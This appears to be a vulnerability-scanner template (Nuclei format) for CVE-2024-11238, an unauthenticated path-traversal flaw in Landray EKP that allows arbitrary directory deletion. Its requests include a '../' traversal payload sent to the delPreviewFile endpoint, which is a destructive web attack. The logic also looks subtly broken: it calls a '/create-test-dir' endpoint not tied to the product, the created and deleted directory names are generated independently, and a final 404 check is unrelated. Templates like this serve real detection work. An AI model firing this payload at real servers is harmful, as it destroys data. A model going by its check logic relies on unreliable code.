id: CVE-2024-11238
info:
  name: Landray EKP - Arbitrary Directory Deletion
  author: nikhilpatidar01
  severity: medium
  description: |
    Landray EKP web application versions v15 and v16 have an unauthorized API endpoint (/sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile) that is vulnerable to arbitrary directory deletion. The 'directoryPath' parameter is not properly sanitized, allowing path traversal attacks ('../'). An attacker can leverage this to delete arbitrary directories on the server's filesystem.
  reference:
    - https://github.com/CoinIsMoney/TempGuide/blob/main/LL-exp-02.pdf
  classification:
    cve-id: CVE-2024-11238
  tags: cve,cve2024,landray,ekp,path-traversal,lfi

http:
  - raw:
      - |+
        GET /create-test-dir?name={{rand_text_alpha(10)}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Directory created"

  - raw:
      - |+
        GET /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile&directoryPath=../{{rand_text_alpha(10)}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Directory deleted"

  - raw:
      - |+
        GET /resource/{{rand_text_alpha(10)}}/test.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers:
      - type: status
        status:
          - 404
